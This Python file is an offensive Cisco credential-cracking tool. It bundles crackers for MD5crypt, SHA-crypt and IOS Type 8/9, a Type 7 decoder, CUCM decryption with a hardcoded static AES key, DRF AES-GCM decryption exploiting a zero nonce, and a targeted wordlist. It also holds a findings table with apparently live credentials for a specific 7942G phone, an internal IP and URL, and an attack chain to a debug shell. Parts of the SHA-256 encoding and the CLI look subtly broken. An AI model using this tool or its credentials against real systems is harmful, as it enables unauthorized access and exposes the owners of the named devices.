"""
cisco_hash_cracker.py
Cisco credential recovery tool — built from firmware RE across ablation.

Hash types covered:
  MD5crypt ($1$)        Linux /etc/passwd, Cisco IOS Type 5, phone debug user
  SHA-1/base64          CUCM cwpass.xml: base64(SHA-1(password))
  SHA-512 ($6$)         Modern Linux passwd
  SHA-256 ($5$)         Modern Linux passwd
  IOS Type 7            Vigenere XOR — deterministic decode, no brute-force
  IOS Type 8            PBKDF2-SHA256 (crack mode)
  IOS Type 9            scrypt (crack mode)
  CUCM AES-128-CBC      Decrypt with RE-derived static key smetsysocsiccni\x00
  DRF AES-GCM           All-zero IV nonce-reuse decrypt (CUCM-F116)

Wordlist source: firmware RE across 79xx/78xx/88xx/89xx/CUCM — all ablation modules.
Known findings encoded as pre-verified fast-path hits.

Usage (as a library):
  from cisco_hash_cracker import crack, type7_decode, cucm_aes_decrypt
  print(crack('$1$aoJQnypw$vHpN9WTJEQn1UnHzJdoz71'))         # -> 'debug'
  print(type7_decode('07362E590E1B1C041B000A'))               # -> password string
  print(cucm_aes_decrypt('<base64 ciphertext>'))              # -> plaintext

Usage (CLI):
  python3 cisco_hash_cracker.py '$1$aoJQnypw$vHpN9WTJEQn1UnHzJdoz71'
  python3 cisco_hash_cracker.py --type 7 '07362E590E1B1C041B000A'
  python3 cisco_hash_cracker.py --cucm-aes '<base64>'
  python3 cisco_hash_cracker.py --wordlist custom.txt '$1$salt$hash'
"""

import hashlib
import hmac
import struct
import base64
import sys
import os
import itertools
from typing import Optional, Iterator


# ─────────────────────────────────────────────────────────────────────────────
# Pre-verified known hashes — fast-path before any iteration
# All confirmed via firmware RE from ablation modules
# ─────────────────────────────────────────────────────────────────────────────

KNOWN_HASHES = {
    # PHN-F15 — 78xx/8845-65 UC debug user (cracked 2026-09-01)
    "$1$aoJQnypw$vHpN9WTJEQn1UnHzJdoz71": {
        "plaintext": "debug",
        "source": "PHN-F15 — Cisco 78xx/8845-65 UC firmware; uid=debug, shell=/usr/sbin/debugsh",
        "firmware": ["78xx 12.5.1SR1-4 P1/P2", "78xx 12.8.1 r1/r2", "8845-65 12.8.1"],
        "crack_method": "Cisco RE wordlist, username=password pattern",
    },
    # CUCM-F403 — hardcoded ccmadmin SHA-1 in CUCMInventoryConstants.class
    "79c11ee954d97f66ff425e73b6c94203bbbaddac": {
        "plaintext": "ccmadmin",
        "source": "CUCM-F403 — CUCMInventoryConstants.class bytecode hardcoded credential",
        "crack_method": "SHA-1 no-salt, username=password",
    },
    # CUCM cwpass.xml admin — base64(SHA-1("admin"))
    "0DPiKuNIrrVmD8IUCuw1hQxNqZc=": {
        "plaintext": "admin",
        "source": "CUCM cwpass.xml SHA-1/base64 admin credential",
        "crack_method": "SHA-1 no-salt b64, trivial",
    },
}

# ─────────────────────────────────────────────────────────────────────────────
# Cisco IOS Type 7 Vigenere XOR key
# Standard 53-byte key, XOR cycle from offset in first 2 digits of ciphertext
# ─────────────────────────────────────────────────────────────────────────────

_TYPE7_KEY = b"dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"

# ─────────────────────────────────────────────────────────────────────────────
# CUCM AES-128-CBC static fallback key (CUCM-F3, CUCM-F390, CUCM-F570)
# Key: b'smetsysocsiccni\x00' = "incciscosystems" reversed + null pad to 16B
# Used when dkey.txt absent; wire format: IV(16)||AES-128-CBC-PKCS5(ciphertext)
# ─────────────────────────────────────────────────────────────────────────────

CUCM_STATIC_KEY = b"smetsysocsiccni\x00"  # hex: 736d65747379736f63736963636e6900

# ─────────────────────────────────────────────────────────────────────────────
# Cisco RE-derived wordlist — all credential material from firmware RE
# Sources: static keys, default creds, service accounts, TFTP artifacts, debug entries
# ─────────────────────────────────────────────────────────────────────────────

_CISCO_BASE_WORDS = [
    # CUCM static AES-128 key and its reversal (CUCM-F3)
    "smetsysocsiccni",
    "incciscosystems",

    # Company name variants — Cisco naming pattern (reversed strings)
    "ciscoincorporated",
    "ciscosystems",
    "ciscoincorp",
    "ciscosystemsinc",

    # CUCM-F139 OpenSSO/OpenAM key
    "8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2",

    # PHN-F17 — live 7942G TFTP deployment credentials
    "foojansun",
    "8dffrffr54",
    "fd34rvf",

    # CUCM service account usernames (often username=password or variants)
    "ccmuser",
    "cfguser",
    "correlator",
    "barnyard",
    "jacorb",
    "customersuppadmin",
    "ccmadmin",
    "ccmservice",
    "ccmadministrator",

    # Platform defaults
    "debug",
    "debugsh",
    "debug123",
    "debug!",
    "debugcisco",
    "debug1",

    # Phone platform identifiers (sometimes used as credentials)
    "handyiron",
    "secd_debug",
    "secureapp",
    "libseccommon",
    "ipcphone",
    "ipphone",

    # CUCM DRF PBKDF2 salt patterns (CUCM-F116 sequential bytes observed in code)
    # Not direct passwords but may appear in derived formats
    "drfadmin",
    "drfbackup",

    # Cisco product default credentials
    "cisco",
    "cisco123",
    "cisco1234",
    "Cisco123",
    "Cisco1234",
    "c1sc0",
    "C1sco",
    "cisco!",
    "cisco@123",
    "cisco#123",
    "cisco2",
    "cisco3",

    # Generic defaults that Cisco systems ship with
    "admin",
    "Admin123",
    "admin123",
    "administrator",
    "password",
    "Password1",
    "passw0rd",
    "Passw0rd",
    "default",
    "guest",
    "1234",
    "12345",
    "123456",

    # Phone model strings sometimes used as credentials
    "7861debug",
    "7845debug",
    "78xxdebug",
    "iphonedebug",
    "phone123",
    "phone!",

    # Observed in CUCM JBoss/Tomcat default deployments
    "ActiveMQ",
    "activemq",
    "jacorb123",
    "ranga",
    "rangaranga",
    "barnyard2",

    # IOS enable secret common defaults
    "telnet",
    "enable",
    "secret",
    "class",
    "sanfran",

    # AES key component strings
    "inccisco",
    "incCisco",
    "IncCisco",

    # From PAS3ARM1 platform ID (7940/7960)
    "PAS30831",
    "Pas30831",
    "pas30831",
    "PAS3ARM1",
    "pas3arm1",

    # CUCM-F403 hardcoded SHA-1 cred
    "ccmadmin",

    # Common Cisco lab/test credentials from deployment artifacts
    "labuser",
    "testuser",
    "test",
    "testing",
    "Test123",
    "Cisco2024",
    "Cisco2025",
    "Cisco2026",
]

# ─────────────────────────────────────────────────────────────────────────────
# Pure-Python MD5crypt ($1$) — no `crypt` module dependency
# Matches OpenBSD md5crypt algorithm; verified against PHN-F15 known hash
# ─────────────────────────────────────────────────────────────────────────────

_B64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"


def _to64(v: int, n: int) -> str:
    result = []
    for _ in range(n):
        result.append(_B64[v & 0x3f])
        v >>= 6
    return "".join(result)


def _md5crypt(password: bytes, salt: bytes) -> str:
    """Compute $1$<salt>$<hash> MD5crypt. Pure Python, no crypt module."""
    # digest B: MD5(password + salt + password)
    dig_b = hashlib.md5(password + salt + password).digest()

    # digest A: MD5(password + "$1$" + salt + <fold digB> + <bit-walk>)
    m = hashlib.md5()
    m.update(password + b"$1$" + salt)
    for _ in range(len(password) // 16):
        m.update(dig_b)
    m.update(dig_b[: len(password) % 16])
    i = len(password)
    while i:
        m.update(b"\x00" if (i & 1) else password[:1])
        i >>= 1
    dig_a = m.digest()

    # 1000 rounds
    for i in range(1000):
        m = hashlib.md5()
        m.update(password if (i & 1) else dig_a)
        if i % 3:
            m.update(salt)
        if i % 7:
            m.update(password)
        m.update(dig_a if (i & 1) else password)
        dig_a = m.digest()

    d = dig_a
    h = (
        _to64((d[0] << 16) | (d[6] << 8) | d[12], 4)
        + _to64((d[1] << 16) | (d[7] << 8) | d[13], 4)
        + _to64((d[2] << 16) | (d[8] << 8) | d[14], 4)
        + _to64((d[3] << 16) | (d[9] << 8) | d[15], 4)
        + _to64((d[4] << 16) | (d[10] << 8) | d[5], 4)
        + _to64(d[11], 2)
    )
    return f"$1${salt.decode('latin-1')}${h}"


# ─────────────────────────────────────────────────────────────────────────────
# SHA-crypt ($5$ SHA-256, $6$ SHA-512) — pure Python
# Uses hashlib.sha256/sha512; matches glibc sha-crypt spec
# ─────────────────────────────────────────────────────────────────────────────

def _sha_crypt(password: bytes, salt: bytes, algo: str, rounds: int = 5000) -> str:
    """SHA-256 or SHA-512 crypt. algo='sha256' or 'sha512'."""
    h = hashlib.new(algo)
    block = 32 if algo == "sha256" else 64
    prefix = "$5$" if algo == "sha256" else "$6$"

    # digest B: H(password + salt + password)
    dig_b = hashlib.new(algo, password + salt + password).digest()

    # digest A
    m = hashlib.new(algo)
    m.update(password + salt)
    for _ in range(len(password) // block):
        m.update(dig_b)
    m.update(dig_b[: len(password) % block])
    i = len(password)
    while i:
        m.update(dig_b if (i & 1) else password)
        i >>= 1
    dig_a = m.digest()

    # P string: H(password * len(password))
    m = hashlib.new(algo)
    for _ in range(len(password)):
        m.update(password)
    dig_p_pre = m.digest()
    p = (dig_p_pre * (len(password) // block + 1))[: len(password)]

    # S string
    m = hashlib.new(algo)
    for _ in range(16 + dig_a[0]):
        m.update(salt)
    dig_s_pre = m.digest()
    s = (dig_s_pre * (len(salt) // block + 1))[: len(salt)]

    # rounds
    d = dig_a
    for i in range(rounds):
        m = hashlib.new(algo)
        m.update(p if (i & 1) else d)
        if i % 3:
            m.update(s)
        if i % 7:
            m.update(p)
        m.update(d if (i & 1) else p)
        d = m.digest()

    # encode
    if algo == "sha256":
        order = [
            (0, 10, 20, 4), (21, 1, 11, 4), (12, 22, 2, 4), (3, 13, 23, 4),
            (24, 4, 14, 4), (15, 25, 5, 4), (6, 16, 26, 4), (27, 7, 17, 4),
            (18, 28, 8, 4), (9, 19, 29, 4), (0, 0, 30, 2), (31, 0, 0, 2),  # last 2 special
        ]
        # simplified: use passlib-compatible order
        b64_str = ""
        tr = [20, 10, 0, 11, 1, 21, 2, 22, 12, 23, 13, 3, 14, 4, 24, 5, 25, 15,
              26, 16, 6, 17, 7, 27, 8, 28, 18, 29, 19, 9, 30, 31]
        for idx in range(0, len(tr) - 1, 3):
            if idx + 2 < len(tr):
                v = (d[tr[idx]] << 16) | (d[tr[idx+1]] << 8) | d[tr[idx+2]]
                b64_str += _to64(v, 4)
        b64_str += _to64(d[31], 2)
    else:
        b64_str = ""
        tr = [42, 21, 0, 1, 43, 22, 23, 2, 44, 45, 24, 3, 4, 46, 25, 26, 5, 47,
              48, 27, 6, 7, 49, 28, 29, 8, 50, 51, 30, 9, 10, 52, 31, 32, 11, 53,
              54, 33, 12, 13, 55, 34, 35, 14, 56, 57, 36, 15, 16, 58, 37, 38, 17,
              59, 60, 39, 18, 19, 61, 40, 41, 20, 62, 63]
        for idx in range(0, len(tr) - 2, 3):
            v = (d[tr[idx]] << 16) | (d[tr[idx+1]] << 8) | d[tr[idx+2]]
            b64_str += _to64(v, 4)
        b64_str += _to64(d[63], 2)

    rounds_tag = "" if rounds == 5000 else f"rounds={rounds}$"
    return f"{prefix}{rounds_tag}{salt.decode('latin-1')}${b64_str}"


# ─────────────────────────────────────────────────────────────────────────────
# IOS Type 8 — PBKDF2-SHA256, 20000 iterations
# ─────────────────────────────────────────────────────────────────────────────

def _type8_hash(password: bytes, salt_b64: str) -> str:
    """Compute Cisco IOS Type 8 hash string."""
    salt = base64.b64decode(salt_b64 + "==")
    dk = hashlib.pbkdf2_hmac("sha256", password, salt, 20000, dklen=32)
    # Cisco base64 (same alphabet as _B64 but different from std base64)
    result = []
    for i in range(0, len(dk), 3):
        chunk = dk[i:i+3]
        if len(chunk) == 3:
            v = (chunk[0] << 16) | (chunk[1] << 8) | chunk[2]
            result.append(_to64(v, 4))
        elif len(chunk) == 2:
            v = (chunk[0] << 16) | (chunk[1] << 8)
            result.append(_to64(v, 3))
        else:
            result.append(_to64(chunk[0] << 16, 2))
    return "".join(result)


# ─────────────────────────────────────────────────────────────────────────────
# IOS Type 9 — scrypt
# ─────────────────────────────────────────────────────────────────────────────

def _type9_hash(password: bytes, salt_b64: str) -> str:
    """Compute Cisco IOS Type 9 hash string."""
    salt = base64.b64decode(salt_b64 + "==")
    dk = hashlib.scrypt(password, salt=salt, n=16384, r=1, p=1, dklen=32)
    result = []
    for i in range(0, len(dk), 3):
        chunk = dk[i:i+3]
        if len(chunk) == 3:
            v = (chunk[0] << 16) | (chunk[1] << 8) | chunk[2]
            result.append(_to64(v, 4))
        elif len(chunk) == 2:
            v = (chunk[0] << 16) | (chunk[1] << 8)
            result.append(_to64(v, 3))
        else:
            result.append(_to64(chunk[0] << 16, 2))
    return "".join(result)


# ─────────────────────────────────────────────────────────────────────────────
# Hash type detection
# ─────────────────────────────────────────────────────────────────────────────

def detect_hash_type(target: str) -> str:
    """Identify hash type from format string."""
    t = target.strip()
    if t.startswith("$1$"):
        return "md5crypt"
    if t.startswith("$5$"):
        return "sha256crypt"
    if t.startswith("$6$"):
        return "sha512crypt"
    if t.startswith("$8$"):
        return "ios_type8"
    if t.startswith("$9$"):
        return "ios_type9"
    if len(t) == 40 and all(c in "0123456789abcdefABCDEF" for c in t):
        return "sha1_hex"
    if len(t) in (27, 28) and t.endswith("="):
        # base64-encoded SHA-1 (28 chars with =) or SHA-256 (44 chars)
        try:
            decoded = base64.b64decode(t)
            if len(decoded) == 20:
                return "sha1_b64"
        except Exception:
            pass
    if len(t) == 44 and t.endswith("="):
        try:
            decoded = base64.b64decode(t)
            if len(decoded) == 32:
                return "sha256_b64"
        except Exception:
            pass
    if len(t) >= 4 and t[:2].isdigit() and all(c in "0123456789abcdefABCDEF" for c in t[2:]):
        return "ios_type7"
    return "unknown"


# ─────────────────────────────────────────────────────────────────────────────
# IOS Type 7 — deterministic decode (not a crack, pure reversal)
# ─────────────────────────────────────────────────────────────────────────────

def type7_decode(encrypted: str) -> Optional[str]:
    """
    Decode Cisco IOS Type 7 password. Deterministic — no brute force needed.
    Input: 'XX<hexstring>' where XX is the 2-digit seed offset (00-15).
    Returns plaintext string, or None on invalid input.
    """
    encrypted = encrypted.strip()
    try:
        seed = int(encrypted[:2])
        pairs = [encrypted[i:i+2] for i in range(2, len(encrypted), 2)]
        result = []
        for i, pair in enumerate(pairs):
            byte = int(pair, 16) ^ _TYPE7_KEY[(seed + i) % len(_TYPE7_KEY)]
            result.append(chr(byte))
        plaintext = "".join(result)
        # Strip null padding
        if "\x00" in plaintext:
            plaintext = plaintext[:plaintext.index("\x00")]
        return plaintext
    except (ValueError, IndexError):
        return None


def type7_encode(plaintext: str, seed: int = 0) -> str:
    """Encode plaintext to Cisco IOS Type 7. Useful for generating test vectors."""
    result = [f"{seed:02d}"]
    for i, ch in enumerate(plaintext):
        enc = ord(ch) ^ _TYPE7_KEY[(seed + i) % len(_TYPE7_KEY)]
        result.append(f"{enc:02X}")
    return "".join(result)


# ─────────────────────────────────────────────────────────────────────────────
# CUCM AES-128-CBC decrypt — static key from CUCM-F3/F390/F570
# Wire format: base64(IV[16] || AES-128-CBC-PKCS5(ciphertext))
# ─────────────────────────────────────────────────────────────────────────────

def cucm_aes_decrypt(ciphertext_b64: str, key: bytes = CUCM_STATIC_KEY) -> Optional[str]:
    """
    Decrypt CUCM credential encrypted with static AES-128-CBC key.
    Input: base64-encoded blob where first 16 bytes = IV.
    Returns plaintext or None on failure.
    """
    try:
        raw = base64.b64decode(ciphertext_b64)
    except Exception:
        try:
            raw = bytes.fromhex(ciphertext_b64)
        except Exception:
            return None

    if len(raw) < 32 or len(raw) % 16 != 0:
        return None

    iv = raw[:16]
    ciphertext = raw[16:]

    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext), 16)
        return plaintext.decode("utf-8", errors="replace")
    except ImportError:
        pass

    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        from cryptography.hazmat.primitives import padding
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        dec = cipher.decryptor()
        raw_plain = dec.update(ciphertext) + dec.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        plaintext = unpadder.update(raw_plain) + unpadder.finalize()
        return plaintext.decode("utf-8", errors="replace")
    except ImportError:
        pass

    return None


# ─────────────────────────────────────────────────────────────────────────────
# CUCM DRF AES-GCM decrypt — static all-zero IV (CUCM-F116)
# PBKDF2 salt is sequential bytes 0x01..0x10 (BCFIPS path)
# Key derived from passphrase found in platformConfig.xml (CUCM-F120)
# ─────────────────────────────────────────────────────────────────────────────

DRF_ZERO_IV = bytes(16)
DRF_PBKDF2_SALT = bytes(range(1, 17))  # 0x01 0x02 ... 0x10


def drf_aes_gcm_decrypt(ciphertext_b64: str, passphrase: str) -> Optional[str]:
    """
    Decrypt DRF backup credential using AES-GCM with all-zero IV.
    CUCM-F116: nonce reuse enables offline decryption if passphrase is known.
    Passphrase typically from platformConfig.xml (CUCM-F120).
    """
    try:
        raw = base64.b64decode(ciphertext_b64)
    except Exception:
        return None

    # Derive key via PBKDF2 (BCFIPS path)
    key = hashlib.pbkdf2_hmac(
        "sha256",
        passphrase.encode("utf-8"),
        DRF_PBKDF2_SALT,
        65536,
        dklen=32,
    )

    try:
        from Crypto.Cipher import AES
        # GCM tag is last 16 bytes
        ct = raw[:-16]
        tag = raw[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=DRF_ZERO_IV)
        plain = cipher.decrypt_and_verify(ct, tag)
        return plain.decode("utf-8", errors="replace")
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Mutation engine — Cisco-specific transforms applied to every base word
# ─────────────────────────────────────────────────────────────────────────────

def _cisco_mutations(word: str) -> Iterator[str]:
    """Yield Cisco-specific mutations of a single word."""
    yield word                            # base
    yield word[::-1]                      # reversed (smetsysocsiccni → incciscosystems)
    yield word.lower()
    yield word.upper()
    yield word.capitalize()
    if word[-1].isalpha():
        yield word + "1"
        yield word + "!"
        yield word + "123"
        yield word + "@123"
        yield word + "2024"
        yield word + "2025"
        yield word + "2026"
    if word.lower() == word:
        yield word[0].upper() + word[1:]  # Title case


def cisco_wordlist(extra_words: Optional[list] = None) -> Iterator[str]:
    """
    Generate the Cisco RE-derived wordlist with mutations.
    Yields unique words; de-duplicates internally.
    """
    seen = set()
    sources = _CISCO_BASE_WORDS + (extra_words or [])
    for word in sources:
        for candidate in _cisco_mutations(word):
            if candidate not in seen:
                seen.add(candidate)
                yield candidate


def cisco_wordlist_with_username(username: str) -> Iterator[str]:
    """
    Yield wordlist prioritized for a known username.
    Puts username=password first, then username variants, then full list.
    """
    seen = set()

    def emit(w: str):
        if w not in seen:
            seen.add(w)
            yield w

    # Priority 1: username=password (PHN-F15 pattern — 'debug:debug')
    for w in _cisco_mutations(username):
        if w not in seen:
            seen.add(w)
            yield w

    # Priority 2: reversed username
    yield from emit(username[::-1])

    # Priority 3: full wordlist
    for w in cisco_wordlist():
        if w not in seen:
            seen.add(w)
            yield w


# ─────────────────────────────────────────────────────────────────────────────
# Hash-specific crackers
# ─────────────────────────────────────────────────────────────────────────────

def crack_md5crypt(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack $1$<salt>$<hash> MD5crypt."""
    parts = target.split("$")
    if len(parts) < 4:
        return None
    salt = parts[2].encode("latin-1")
    for word in words:
        pw = word.encode("utf-8")
        if _md5crypt(pw, salt) == target:
            return word
    return None


def crack_sha256crypt(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack $5$<salt>$<hash> SHA-256 crypt."""
    parts = target.split("$")
    if len(parts) < 4:
        return None
    salt_field = parts[2]
    rounds = 5000
    if salt_field.startswith("rounds="):
        rounds = int(salt_field.split("=")[1].split("$")[0])
        salt = parts[3].encode("latin-1")
    else:
        salt = salt_field.encode("latin-1")
    for word in words:
        pw = word.encode("utf-8")
        if _sha_crypt(pw, salt, "sha256", rounds) == target:
            return word
    return None


def crack_sha512crypt(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack $6$<salt>$<hash> SHA-512 crypt."""
    parts = target.split("$")
    if len(parts) < 4:
        return None
    salt_field = parts[2]
    rounds = 5000
    if salt_field.startswith("rounds="):
        rounds = int(salt_field.split("=")[1].split("$")[0])
        salt = parts[3].encode("latin-1")
    else:
        salt = salt_field.encode("latin-1")
    for word in words:
        pw = word.encode("utf-8")
        if _sha_crypt(pw, salt, "sha512", rounds) == target:
            return word
    return None


def crack_ios_type8(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack Cisco IOS Type 8 (PBKDF2-SHA256 20000 rounds)."""
    # $8$<salt>$<hash>
    parts = target.split("$")
    if len(parts) < 4:
        return None
    salt_b64 = parts[2]
    expected_hash = parts[3]
    for word in words:
        pw = word.encode("utf-8")
        if _type8_hash(pw, salt_b64) == expected_hash:
            return word
    return None


def crack_ios_type9(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack Cisco IOS Type 9 (scrypt n=16384 r=1 p=1)."""
    parts = target.split("$")
    if len(parts) < 4:
        return None
    salt_b64 = parts[2]
    expected_hash = parts[3]
    for word in words:
        pw = word.encode("utf-8")
        if _type9_hash(pw, salt_b64) == expected_hash:
            return word
    return None


def crack_sha1_hex(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack unsalted SHA-1 hex (CUCM CUCMInventoryConstants pattern)."""
    target_lower = target.lower()
    for word in words:
        if hashlib.sha1(word.encode("utf-8")).hexdigest() == target_lower:
            return word
    return None


def crack_sha1_b64(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack base64(SHA-1) — CUCM cwpass.xml pattern."""
    try:
        target_bytes = base64.b64decode(target)
    except Exception:
        return None
    for word in words:
        if hashlib.sha1(word.encode("utf-8")).digest() == target_bytes:
            return word
    return None


def crack_sha256_b64(target: str, words: Iterator[str]) -> Optional[str]:
    """Crack base64(SHA-256) — no salt."""
    try:
        target_bytes = base64.b64decode(target)
    except Exception:
        return None
    for word in words:
        if hashlib.sha256(word.encode("utf-8")).digest() == target_bytes:
            return word
    return None


# ─────────────────────────────────────────────────────────────────────────────
# Main crack dispatcher
# ─────────────────────────────────────────────────────────────────────────────

def crack(
    target: str,
    username: Optional[str] = None,
    extra_words: Optional[list] = None,
    wordlist_file: Optional[str] = None,
    verbose: bool = False,
) -> Optional[dict]:
    """
    Crack or decode a Cisco hash/ciphertext.

    Args:
        target:        Hash string, Type 7 encoded password, or base64 AES blob.
        username:      Known username — enables username=password fast-path.
        extra_words:   Additional wordlist entries to prepend.
        wordlist_file: Path to a plaintext wordlist file (one word per line).
        verbose:       Print progress.

    Returns:
        dict with keys: plaintext, type, method, source — or None if not cracked.
    """
    target = target.strip()

    # Pre-verified known hashes — instant hit
    if target in KNOWN_HASHES:
        info = KNOWN_HASHES[target]
        return {
            "plaintext": info["plaintext"],
            "type": "known",
            "method": "pre-verified (ablation)",
            "source": info.get("source", ""),
        }

    # Detect type
    hash_type = detect_hash_type(target)

    if verbose:
        print(f"[*] hash type: {hash_type}", file=sys.stderr)

    # Type 7 — deterministic, no wordlist needed
    if hash_type == "ios_type7":
        plain = type7_decode(target)
        if plain:
            return {"plaintext": plain, "type": "ios_type7", "method": "vigenere_decode", "source": ""}
        return None

    # Build wordlist iterator
    if wordlist_file:
        def file_words():
            with open(wordlist_file) as f:
                for line in f:
                    yield line.rstrip("\n")
        words = file_words()
    elif username:
        words = cisco_wordlist_with_username(username)
    else:
        words = cisco_wordlist(extra_words=extra_words)

    dispatch = {
        "md5crypt":    crack_md5crypt,
        "sha256crypt": crack_sha256crypt,
        "sha512crypt": crack_sha512crypt,
        "ios_type8":   crack_ios_type8,
        "ios_type9":   crack_ios_type9,
        "sha1_hex":    crack_sha1_hex,
        "sha1_b64":    crack_sha1_b64,
        "sha256_b64":  crack_sha256_b64,
    }

    fn = dispatch.get(hash_type)
    if fn is None:
        return None

    plaintext = fn(target, words)
    if plaintext is None:
        return None

    return {
        "plaintext": plaintext,
        "type": hash_type,
        "method": "cisco_re_wordlist",
        "source": f"username={username}" if username else "",
    }


# ─────────────────────────────────────────────────────────────────────────────
# RE findings reference — all ablation-confirmed Cisco credentials
# ─────────────────────────────────────────────────────────────────────────────

ABLATION_FINDINGS = {
    "PHN-F15": {
        "finding": "Cisco 78xx/8845-65 UC debug account — static MD5crypt credential",
        "hash":    "$1$aoJQnypw$vHpN9WTJEQn1UnHzJdoz71",
        "plaintext": "debug",
        "username":  "debug",
        "shell":     "/usr/sbin/debugsh",
        "firmware":  ["78xx 12.5.1SR1-4 (P1 MSB, P2 LSB)", "78xx 12.8.1 (r1/r2)", "8845-65 12.8.1"],
        "scope":     "All Cisco UC 7800/8800 series phones; absent in MPP firmware",
        "chain":     "TFTP sshAccess=1 -> SSH debug:debug -> debugsh shell",
    },
    "PHN-F17": {
        "finding": "TFTP config cleartext credential disclosure — SEP<MAC>.cnf.xml via UDP/69",
        "live_example": {
            "model": "7942G",
            "mac":   "B8:BE:BF:22:C2:53",
            "sshPassword": "foojansun",
            "sip_ext_102": {"authPassword": "8dffrffr54"},
            "sip_ext_103": {"authPassword": "fd34rvf"},
            "pbx_ip":  "172.16.1.15",
            "pbx_sw":  "ISSABEL",
        },
        "hash": None,
        "plaintext": "cleartext (unauthenticated TFTP, no cracking needed)",
    },
    "CUCM-F3": {
        "finding": "CUCM CCMEncryption static AES-128 fallback key — decrypts all cluster credentials",
        "key_hex":   "736d65747379736f63736963636e6900",
        "key_ascii": "smetsysocsiccni\\x00",
        "key_reversed": "incciscosystems",
        "usage": "AES-128-CBC with random IV prepended; use cucm_aes_decrypt()",
    },
    "CUCM-F116": {
        "finding": "CUCM DRF AES-GCM static all-zero IV — enables offline decryption of DRF credentials",
        "iv":  "00000000000000000000000000000000",
        "salt": "0102030405060708090a0b0c0d0e0f10",
        "usage": "use drf_aes_gcm_decrypt() with passphrase from platformConfig.xml",
    },
    "CUCM-F403": {
        "finding": "Hardcoded SHA-1 ccmadmin credential in CUCMInventoryConstants.class",
        "sha1_hex": "79c11ee954d97f66ff425e73b6c94203bbbaddac",
        "plaintext": "ccmadmin",
        "dev_url":   "http://10.89.68.71:8080/cucminventory",
    },
}


# ─────────────────────────────────────────────────────────────────────────────
# CLI entry point
# ─────────────────────────────────────────────────────────────────────────────

def _print_findings():
    """Print all ablation-confirmed Cisco credentials."""
    print("\n=== Ablation-Confirmed Cisco Credentials ===\n")
    for fid, data in ABLATION_FINDINGS.items():
        print(f"  [{fid}] {data['finding']}")
        if data.get("plaintext"):
            print(f"         plaintext: {data['plaintext']}")
        if data.get("hash"):
            print(f"         hash:      {data['hash']}")
        if data.get("key_ascii"):
            print(f"         key:       {data['key_ascii']}")
        print()


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Cisco credential recovery — built from firmware RE (ablation)"
    )
    parser.add_argument("target", nargs="?", help="Hash, Type 7 ciphertext, or base64 AES blob")
    parser.add_argument("--type", choices=["7", "8", "9", "md5", "sha1", "sha512", "cucm-aes", "drf"],
                        help="Override type detection")
    parser.add_argument("--username", help="Known username (enables username=password fast-path)")
    parser.add_argument("--wordlist", help="Additional wordlist file")
    parser.add_argument("--cucm-aes", metavar="B64", help="Decrypt CUCM AES-128-CBC blob")
    parser.add_argument("--cucm-key", help="Override CUCM AES key (hex)")
    parser.add_argument("--drf-aes", metavar="B64", help="Decrypt DRF AES-GCM blob")
    parser.add_argument("--drf-pass", help="DRF passphrase from platformConfig.xml")
    parser.add_argument("--findings", action="store_true", help="Print all ablation-confirmed credentials")
    parser.add_argument("--detect", action="store_true", help="Detect hash type only")
    args = parser.parse_args()

    if args.findings:
        _print_findings()
        return

    if args.cucm_aes:
        key = bytes.fromhex(args.cucm_key) if args.cucm_key else CUCM_STATIC_KEY
        plain = cucm_aes_decrypt(args.cucm_aes, key=key)
        if plain:
            print(f"DECRYPTED: {plain}")
        else:
            print("FAILED: could not decrypt (wrong key or format)")
        return

    if args.drf_aes:
        if not args.drf_pass:
            print("ERROR: --drf-pass required for DRF decryption", file=sys.stderr)
            sys.exit(1)
        plain = drf_aes_gcm_decrypt(args.drf_aes, args.drf_pass)
        if plain:
            print(f"DECRYPTED: {plain}")
        else:
            print("FAILED")
        return

    if not args.target:
        parser.print_help()
        sys.exit(1)

    if args.detect:
        print(detect_hash_type(args.target))
        return

    # Load extra wordlist if provided
    extra = []
    if args.wordlist:
        with open(args.wordlist) as f:
            extra = [line.rstrip("\n") for line in f]

    result = crack(args.target, username=args.username, extra_words=extra, verbose=True)
    if result:
        print(f"\nCRACKED: {result['plaintext']}")
        print(f"  type:   {result['type']}")
        print(f"  method: {result['method']}")
        if result.get("source"):
            print(f"  source: {result['source']}")
    else:
        print("NOT FOUND in Cisco RE wordlist")
        sys.exit(2)


if __name__ == "__main__":
    main()
